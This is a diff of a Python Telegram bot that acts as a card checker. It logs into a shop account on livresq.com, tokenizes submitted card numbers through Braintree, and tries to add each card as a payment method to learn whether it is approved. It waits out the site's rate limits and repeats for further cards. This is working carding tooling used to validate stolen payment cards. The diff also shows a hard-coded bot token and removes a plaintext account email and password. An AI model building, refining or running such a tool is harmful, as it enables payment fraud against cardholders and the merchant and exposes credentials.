@@ -9,14 +9,19 @@ import time
 import logging
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import ConversationHandler, MessageHandler, filters
 
-# ---------- YOUR CREDENTIALS (keep safe) ----------
-EMAIL = "latoh66921@aratrin.com"
-PASSWORD = "Ajaykumar@28"
+# ---------- BOT CONFIGURATION ----------
 BOT_TOKEN = "7033106060:AAHXbgIlI7iMngcRw543ONGUvFzt-TTOvbM"
 ALLOWED_USER_ID = 2117119246
 
 logging.basicConfig(level=logging.INFO)
+
+# Conversation states
+EMAIL_STATE, PASSWORD_STATE, CARD_STATE = range(3)
+
+# Dictionary to store user sessions
+user_sessions = {}
 
 # ---------- HEADER FUNCTIONS ----------
 def h1():
@@ -124,37 +129,35 @@ def bt_h(fp):
         'Accept-Language': 'en-US,en;q=0.9',
     }
 
-def login():
-    """Improved login with retry logic and proper status code handling"""
+def login(email, password):
+    """Login with provided credentials"""
     try:
         s = requests.Session()
         
         # Step 1: Get login page
-        print("📍 Step 1: Fetching login page...")
+        print(f"📍 Logging in as: {email}")
         r = s.get('https://livresq.com/en/my-account/', headers=h1(), timeout=10)
         print(f"   Status: {r.status_code}")
         
         if r.status_code == 503:
-            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
-            return None
+            print("⚠️  SERVER UNAVAILABLE (503)")
+            return None, "Server unavailable (503)"
         
         if r.status_code != 200:
-            print(f"❌ Failed to get login page. Status: {r.status_code}")
-            return None
+            return None, f"Failed to get login page. Status: {r.status_code}"
         
         # Extract nonce
         n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
         if not n:
-            print("❌ LOGIN ERROR: Could not extract login nonce")
-            return None
+            return None, "Could not extract login nonce"
         
         print("✅ Login Nonce found")
         
         # Step 2: Submit login credentials
-        print("📍 Step 2: Submitting login credentials...")
+        print("📍 Submitting credentials...")
         d = {
-            'username': EMAIL,
-            'password': PASSWORD,
+            'username': email,
+            'password': password,
             'woocommerce-login-nonce': n.group(1),
             '_wp_http_referer': '/en/contul-meu/',
             'login': 'Log in',
@@ -166,136 +169,94 @@ def login():
         
         # Handle 503 error
         if r.status_code == 503:
-            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
-            return None
+            return None, "Server unavailable (503)"
         
         if r.status_code != 200:
-            print(f"❌ Login POST failed. Status: {r.status_code}")
-            return None
+            return None, f"Login POST failed. Status: {r.status_code}"
         
         # Check for explicit error messages
         if 'woocommerce-error' in r.text:
-            print("❌ LOGIN ERROR: WooCommerce error detected")
             error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
             if error_match:
                 error_msg = re.sub(r'<[^>]+>', '', error_match.group(1).strip())
-                print(f"   Error: {error_msg}")
-            return None
+                return None, f"Login error: {error_msg}"
+            return None, "Login failed"
         
         # Verify login success
-        print("📍 Step 3: Verifying login...")
+        print("📍 Verifying login...")
         
         # Check for logout button
         if re.search(r'<a[^>]*href="[^"]*logout[^"]*"[^>]*>.*?Log\s*Out|Logout', r.text, re.IGNORECASE):
-            print("✅ LOGIN SUCCESSFUL - Logout button found!")
-            return s
+            print("✅ LOGIN SUCCESSFUL")
+            return s, "Login successful"
         
         # Check for account navigation
         if 'woocommerce-MyAccount-navigation' in r.text or 'customer-logout' in r.text:
-            print("✅ LOGIN SUCCESSFUL - Account page detected!")
-            return s
+            print("✅ LOGIN SUCCESSFUL")
+            return s, "Login successful"
         
-        print("❌ LOGIN ERROR: Could not verify login status")
-        print(f"   URL after login: {r.url}")
-        return None
+        return None, "Could not verify login status"
             
     except requests.exceptions.Timeout:
-        print("❌ LOGIN ERROR: Request timeout - server not responding")
-        return None
+        return None, "Request timeout"
     except requests.exceptions.ConnectionError:
-        print("❌ LOGIN ERROR: Connection failed - check internet connection")
-        return None
+        return None, "Connection failed"
     except Exception as e:
-        print(f"❌ LOGIN ERROR: {str(e)}")
-        return None
+        return None, f"Login error: {str(e)}"
 
 def get_nonces(s):
     """Extract nonces from add payment method page"""
     try:
-        print("📍 Fetching nonces...")
         r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3(), timeout=10)
         
         if r.status_code == 503:
-            print("⚠️  SERVER UNAVAILABLE (503)")
             return None, None
         
         if r.status_code != 200:
-            print(f"❌ Failed to get nonces page. Status: {r.status_code}")
             return None, None
         
         # Extract add payment method nonce
         an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
-        if an:
-            print("   ✅ Add Nonce found")
-        else:
-            print("   ❌ Add Nonce NOT FOUND")
         
         # Extract client token nonce
         cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
         if not cn:
             cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
         
-        if cn:
-            print("   ✅ Client Nonce found")
-        else:
-            print("   ❌ Client Nonce NOT FOUND")
-        
         if not an or not cn:
             return None, None
         
         return an.group(1), cn.group(1)
-    except requests.exceptions.Timeout:
-        print("❌ ERROR in get_nonces: Request timeout")
-        return None, None
-    except Exception as e:
-        print(f"❌ ERROR in get_nonces: {str(e)}")
+    except:
         return None, None
 
 def get_fp(s, cn):
     """Get authorization fingerprint from Braintree"""
     if not cn:
-        print("❌ ERROR: Client nonce is None")
         return None
     
     try:
-        print("📍 Getting fingerprint...")
         d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
         r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d, timeout=10)
         
-        if r.status_code == 503:
-            print("⚠️  SERVER UNAVAILABLE (503)")
-            return None
-        
         if r.status_code != 200:
-            print(f"❌ ERROR: Status code {r.status_code}")
             return None
         
         j = r.json()
         if 'data' not in j:
-            print("❌ ERROR: No 'data' field in response")
             return None
         
         dt = base64.b64decode(j['data']).decode('utf-8')
         fp = json.loads(dt).get('authorizationFingerprint')
         
-        if fp:
-            print("   ✅ Fingerprint obtained")
-            return fp
-        else:
-            print("❌ ERROR: Could not extract fingerprint")
-            return None
+        return fp
             
-    except requests.exceptions.Timeout:
-        print("❌ ERROR in get_fp: Request timeout")
-        return None
-    except Exception as e:
-        print(f"❌ ERROR in get_fp: {str(e)}")
+    except:
         return None
 
 async def tok(fp, cc, mm, yy, cv):
     """Tokenize credit card via Braintree GraphQL"""
     try:
-        print("📍 Tokenizing card...")
         async with aiohttp.ClientSession() as ses:
             sid = str(uuid.uuid4())
             q = {
@@ -315,31 +276,20 @@ async def tok(fp, cc, mm, yy, cv):
             }
             async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 if resp.status != 200:
-                    print(f"   ❌ ERROR: Braintree status code {resp.status}")
                     return None
                 
                 res = await resp.json()
                 token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                 
-                if token:
-                    print("   ✅ Token generated")
-                    return token
-                else:
-                    print("   ❌ ERROR: Could not generate token")
-                    return None
+                return token
                     
-    except asyncio.TimeoutError:
-        print("   ❌ ERROR in tok: Request timeout")
-        return None
-    except Exception as e:
-        print(f"   ❌ ERROR in tok: {str(e)}")
+    except:
         return None
 
 def add_pm(s, pt, an):
     """Add payment method to account"""
     for attempt in range(4):
         try:
-            print(f"📍 Adding payment method (attempt {attempt + 1}/4)...")
             pd = {
                 'payment_method': 'braintree_credit_card',
                 'wc-braintree-credit-card-card-type': 'visa',
@@ -357,13 +307,11 @@ def add_pm(s, pt, an):
             r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd, timeout=10)
             
             if r.status_code == 503:
-                print("   ⚠️  SERVER UNAVAILABLE (503) - Waiting 15s...")
                 time.sleep(15)
                 continue
             
             # Rate limiting check
             if 'You cannot add a new payment method so soon' in r.text:
-                print(f"   ⏱️  Rate limited - Waiting 15s...")
                 time.sleep(15)
                 continue
             
@@ -372,12 +320,10 @@ def add_pm(s, pt, an):
             if em:
                 et = re.sub(r'\s+', ' ', em.group(1).strip())
                 et = re.sub(r'&nbsp;', ' ', et)
-                print(f"   ❌ Card Error: {et}")
                 return False, et
             
             # Success check
             if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
-                print("   ✅ CARD APPROVED")
                 return True, "APPROVED"
             
             # Message check
@@ -385,21 +331,15 @@ def add_pm(s, pt, an):
             if sm:
                 st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
                 st = re.sub(r'\s+', ' ', st)
-                print(f"   ✅ Card Response: {st}")
                 return True, st
             
             # Wait before retry
             if attempt < 3:
-                print("   ⏱️  Waiting 15s before retry...")
                 time.sleep(15)
                 
-        except requests.exceptions.Timeout:
-            print(f"   ⚠️  Request timeout - Waiting 15s...")
-            time.sleep(15)
-        except Exception as e:
-            print(f"   ❌ ERROR in add_pm: {str(e)}")
+        except:
+            pass
     
-    print("   ❌ Unknown error after retries")
     return False, "UNKNOWN"
 
 async def proc(s, cc, mm, yy, cv):
@@ -420,50 +360,137 @@ async def proc(s, cc, mm, yy, cv):
     
     return add_pm(s, pt, an)
 
-# ---------- TELEGRAM HANDLER ----------
-async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- TELEGRAM CONVERSATION HANDLERS ----------
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start command"""
     user_id = update.effective_user.id
     if ALLOWED_USER_ID and user_id != ALLOWED_USER_ID:
-        await update.message.reply_text("Unauthorized user.")
-        return
+        await update.message.reply_text("❌ Unauthorized user.")
+        return ConversationHandler.END
+    
+    await update.message.reply_text(
+        "👋 Welcome! I'll help you check cards.\n\n"
+        "First, send your email for livresq.com account:"
+    )
+    return EMAIL_STATE
 
-    if not context.args:
-        await update.message.reply_text("Usage: /check <card_number|expiry_month|expiry_year|cvv>")
-        return
+async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get email from user"""
+    user_id = update.effective_user.id
+    email = update.message.text.strip()
+    
+    # Basic email validation
+    if '@' not in email or '.' not in email:
+        await update.message.reply_text("❌ Invalid email format. Please try again:")
+        return EMAIL_STATE
+    
+    user_sessions[user_id] = {'email': email}
+    await update.message.reply_text(
+        f"✅ Email saved: {email}\n\n"
+        "Now send your password:"
+    )
+    return PASSWORD_STATE
 
-    raw = ' '.join(context.args).strip()
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get password from user"""
+    user_id = update.effective_user.id
+    password = update.message.text.strip()
+    
+    if len(password) < 4:
+        await update.message.reply_text("❌ Password too short. Please try again:")
+        return PASSWORD_STATE
+    
+    user_sessions[user_id]['password'] = password
+    await update.message.reply_text(
+        "✅ Credentials saved!\n\n"
+        "Now send card in this format:\n"
+        "<card_number>|<month>|<year>|<cvv>\n\n"
+        "Example: 4111111111111111|12|25|123"
+    )
+    return CARD_STATE
+
+async def get_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Get and process card"""
+    user_id = update.effective_user.id
+    
+    if user_id not in user_sessions:
+        await update.message.reply_text("❌ Session expired. Use /start to begin.")
+        return ConversationHandler.END
+    
+    raw = update.message.text.strip()
     parts = raw.split('|')
+    
     if len(parts) != 4:
-        await update.message.reply_text("Invalid format. Use: /check 4111111111111111|12|26|123")
-        return
-
+        await update.message.reply_text(
+            "❌ Invalid format.\n\n"
+            "Please send: <card>|<month>|<year>|<cvv>\n"
+            "Example: 4111111111111111|12|25|123"
+        )
+        return CARD_STATE
+    
     cc, mes, ano, cvv = [p.strip() for p in parts]
-
-    # Validate digit lengths (basic)
+    
     if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
-        await update.message.reply_text("All fields must be numeric.")
-        return
-
+        await update.message.reply_text("❌ All fields must be numeric. Please try again:")
+        return CARD_STATE
+    
+    # Get credentials
+    email = user_sessions[user_id]['email']
+    password = user_sessions[user_id]['password']
+    
     await update.message.reply_text("⏳ Processing card... (this may take 30-60s)")
-
+    
     try:
-        s = login()
+        # Login with provided credentials
+        s, login_msg = login(email, password)
         if not s:
-            await update.message.reply_text("❌ LOGIN FAILED")
-            return
+            await update.message.reply_text(f"❌ LOGIN FAILED\n{login_msg}")
+            return CARD_STATE
         
+        # Process card
         ok, msg = await proc(s, cc, mes, ano, cvv)
         if ok:
             await update.message.reply_text(f"✅ Response: {msg}")
         else:
             await update.message.reply_text(f"❌ Response: {msg}")
+        
+        # Ask if they want to check another card
+        await update.message.reply_text(
+            "Want to check another card?\n"
+            "Send the card details or /start for new account"
+        )
+        return CARD_STATE
+        
     except Exception as e:
         await update.message.reply_text(f"⚠️ Error: {str(e)}")
+        return CARD_STATE
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Cancel conversation"""
+    user_id = update.effective_user.id
+    if user_id in user_sessions:
+        del user_sessions[user_id]
+    
+    await update.message.reply_text("❌ Cancelled. Use /start to begin again.")
+    return ConversationHandler.END
 
 # ---------- MAIN ----------
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("check", check_card))
+    
+    # Conversation handler for login and card check flow
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start)],
+        states={
+            EMAIL_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
+            PASSWORD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+            CARD_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+    
+    app.add_handler(conv_handler)
     print("🤖 Bot is running... Press Ctrl+C to stop")
     app.run_polling()
 
